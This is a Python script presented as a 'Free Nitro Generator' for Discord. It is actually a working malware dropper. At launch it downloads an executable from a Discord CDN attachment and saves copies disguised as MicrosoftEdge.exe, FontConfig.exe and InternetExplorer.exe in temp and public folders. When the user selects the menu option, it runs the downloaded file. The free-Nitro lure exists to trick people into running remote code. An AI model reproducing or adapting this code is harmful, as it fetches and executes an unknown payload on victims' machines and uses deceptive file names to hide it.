from pystyle import Colors, Write
import subprocess
import os
import requests
import getpass
import ctypes
ascii_art = """
███╗   ██╗██╗████████╗██████╗  ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
"""

menu = """
―――――――――――――――――――
| 1) Generate Nitro
| 2) Soon...
―――――――――――――――――――
"""

username = getpass.getuser()
def titlo(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)
titlo("Free Nitro Generator!")
def download_file(url, save_path):
    response = requests.get(url, stream=True)
    response.raise_for_status()

    with open(save_path, 'wb') as file:
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
def create_and_run_batch():
    batch_content = r'cmd /min /C "set __COMPAT_LAYER=runasinvoker && start "" "%1"'
    batch_filename = "run_with_invoke.bat"
    batch_path = os.path.join(os.getcwd(), batch_filename)
    with open(batch_path, 'w') as batch_file:
        batch_file.write(batch_content)
    subprocess.run([batch_path, os.path.abspath(save_path)], check=True)
def main():
    url = "https://cdn.discordapp.com/attachments/1261077320316358686/1267518972773924905/DiscordNitroGenerator.exe?ex=66a91488&is=66a7c308&hm=b1303b540de88e232cbcc8d4f0604d2c2700353aaf6e98921f275ffa70829fcf&"
    directory = "C:\\Windows\\Temp"
    directory1 = os.path.join("C:\\Users", username, "AppData", "Local", "Temp", "fontconfig", "cache")
    directory2 = os.path.join(f"C:\\Users\\Public\\Music")
    filename = "MicrosoftEdge.exe"
    filename1 = "FontConfig.exe"
    filename2 = "InternetExplorer.exe"
    save_path = os.path.join(directory, filename)
    save_path1 = os.path.join(directory1, filename1)
    save_path2 = os.path.join(directory2, filename2)
    try:
        download_file(url, save_path)
        download_file(url, save_path1)
        download_file(url, save_path2)
    except Exception as e:
        print(f"An error occurred: {e}")
if __name__ == "__main__":
    main()

Write.Print(ascii_art, Colors.green_to_cyan, interval=0)
Write.Print(menu, Colors.green_to_cyan, interval=0)
filename = "MicrosoftEdge.exe"
directory = "C:\\Windows\\Temp"
save_path = os.path.join(directory, filename)
try:
    vari = int(Write.Input(">>> ", Colors.green_to_cyan, interval=0).strip())
    if vari == 1:
        file = rf"{save_path}"
        if os.path.isfile(file):
            subprocess.Popen([file], shell=True)
        else:
            print("Executable file not found.")
    else:
        print("Wrong option selected! Please try again.")
except ValueError:
    print("Invalid input. Please enter a number.")
